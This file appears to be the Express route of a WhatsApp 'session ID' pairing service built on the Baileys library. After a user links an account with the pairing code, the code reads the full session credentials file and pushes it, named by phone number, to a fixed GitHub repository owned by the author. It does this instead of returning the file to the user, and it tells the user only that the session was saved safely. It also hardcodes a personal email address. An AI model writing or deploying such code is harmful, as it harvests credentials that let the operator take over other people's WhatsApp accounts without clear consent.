import express from 'express';
import fs from 'fs';
import pino from 'pino';
import { execSync } from 'child_process';
import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';

const router = express.Router();

// GitHub configuration
const GITHUB_USERNAME = 'K0reem0';
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GITHUB_REPO = 'TheMystic-Bot-MD';
const SESSION_FOLDER = 'MysticSession';
const REPO_DIR = '/tmp/repo'; // Temporary directory for cloning the repo

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error('Error removing file:', e);
    }
}

// Function to push session to GitHub
async function pushToGitHub(sessionData, phoneNumber) {
    try {
        if (!GITHUB_TOKEN) {
            throw new Error('GitHub token is missing');
        }

        // Create temporary directory if it doesn't exist
        if (!fs.existsSync(REPO_DIR)) {
            fs.mkdirSync(REPO_DIR, { recursive: true });
        }

        // Clone the repository
        const remoteUrl = `https://${GITHUB_USERNAME}:${GITHUB_TOKEN}@github.com/${GITHUB_USERNAME}/${GITHUB_REPO}.git`;
        execSync(`git clone ${remoteUrl} ${REPO_DIR}`, { cwd: REPO_DIR });

        // Configure git
        execSync('git config user.name "K0reem0"', { cwd: REPO_DIR });
        execSync('git config user.email "202470349@su.edu.ye"', { cwd: REPO_DIR });

        // Create session directory if it doesn't exist
        const sessionDir = `${REPO_DIR}/${SESSION_FOLDER}`;
        if (!fs.existsSync(sessionDir)) {
            fs.mkdirSync(sessionDir);
        }

        // Save session file
        const fileName = `${sessionDir}/${phoneNumber}_creds.json`;
        fs.writeFileSync(fileName, sessionData);

        // Git commands
        execSync('git add .', { cwd: REPO_DIR });
        execSync(`git commit -m "Added session for ${phoneNumber}"`, { cwd: REPO_DIR });
        execSync(`git push origin main`, { cwd: REPO_DIR });

        // Clean up
        removeFile(REPO_DIR);

        return true;
    } catch (error) {
        console.error('GitHub push error:', error);
        removeFile(REPO_DIR);
        return false;
    }
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    let dirs = './' + (num || session);

    // Clean old session
    await removeFile(dirs);

    // Clean and validate phone number
    num = num.replace(/[^0-9]/g, '');
    const phone = pn('+' + num);
    if (!phone.isValid()) {
        if (!res.headersSent) {
            return res.status(400).send({ 
                code: 'Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, 84987654321 for Vietnam, etc.) without + or spaces.' 
            });
        }
        return;
    }

    // Format as E.164 without +
    num = phone.getNumber('e164').replace('+', '');
    const userJid = jidNormalizedUser(num + '@s.whatsapp.net'); // Define userJid here

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);
        let credsReady = false;

        try {
            const { version } = await fetchLatestBaileysVersion();
            let KnightBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows('Chrome'),
                markOnlineOnConnect: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 250,
                maxRetries: 5,
            });

            KnightBot.ev.on('creds.update', async () => {
                await saveCreds();
                credsReady = true;
                console.log("💾 Credentials updated and saved");
            });

            KnightBot.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, isNewLogin, isOnline } = update;

                if (connection === 'open') {
                    console.log("✅ Connected successfully!");
                    await delay(5000);

                    try {
                        const sessionKnight = fs.readFileSync(dirs + '/creds.json');
                        
                        // Push to GitHub instead of sending to user
                        const pushSuccess = await pushToGitHub(sessionKnight, num);
                        
                        if (pushSuccess) {
                            await KnightBot.sendMessage(userJid, {
                                image: { url: 'https://files.catbox.moe/yjj0x6.jpg' },
                                caption: `شكرا لإستخدامك بوت هايسو 🤗\n\nتم حفظ بيانات الجلسة بأمان في الريبو.`
                            });

                            await KnightBot.sendMessage(userJid, {
                                text: `⚠️ تم حفظ بيانات الجلسة بنجاح في الريبو ⚠️\n
┌┤✑  هايسو بوت
│└────────────┈ ⳹
│©2024 AURTHER
└─────────────────┈ ⳹\n\n`
                            });
                        } else {
                            await KnightBot.sendMessage(userJid, {
                                text: `❌ فشل في حفظ بيانات الجلسة. يرجى المحاولة مرة أخرى.`
                            });
                        }

                        // Clean up session
                        await delay(6000);
                        removeFile(dirs);
                        console.log("✅ Session cleaned up successfully");
                    } catch (error) {
                        console.error("❌ Error:", error);
                        removeFile(dirs);
                    }
                }

                if (isNewLogin) console.log("🔐 New login via pair code");
                if (isOnline) console.log("📶 Client is online");

                if (connection === 'close') {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                        console.log("❌ Logged out from WhatsApp. Need to generate new pair code.");
                    } else {
                        console.log("🔁 Connection closed — restarting...");
                        initiateSession();
                    }
                }
            });

            // Request pairing code if needed
            if (!KnightBot.authState.creds.registered) {
                await delay(3000);
                num = num.replace(/[^\d+]/g, '');
                if (num.startsWith('+')) num = num.substring(1);

                try {
                    let code = await KnightBot.requestPairingCode(num);
                    code = code?.match(/.{1,4}/g)?.join('-') || code;
                    if (!res.headersSent) {
                        console.log({ num, code });
                        await res.send({ code });
                    }
                } catch (error) {
                    console.error('Error requesting pairing code:', error);
                    if (!res.headersSent) {
                        res.status(503).send({ code: 'Failed to get pairing code. Please check your phone number and try again.' });
                    }
                }
            }

        } catch (err) {
            console.error('Error initializing session:', err);
            if (!res.headersSent) {
                res.status(503).send({ code: 'Service Unavailable' });
            }
        }
    }

    await initiateSession();
});

// Error handling
process.on('uncaughtException', (err) => {
    let e = String(err);
    if (e.includes("conflict")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("Socket connection timeout")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    if (e.includes("Stream Errored")) return;
    if (e.includes("Stream Errored (restart required)")) return;
    if (e.includes("statusCode: 515")) return;
    if (e.includes("statusCode: 503")) return;
    console.log('Caught exception: ', err);
});

export default router;
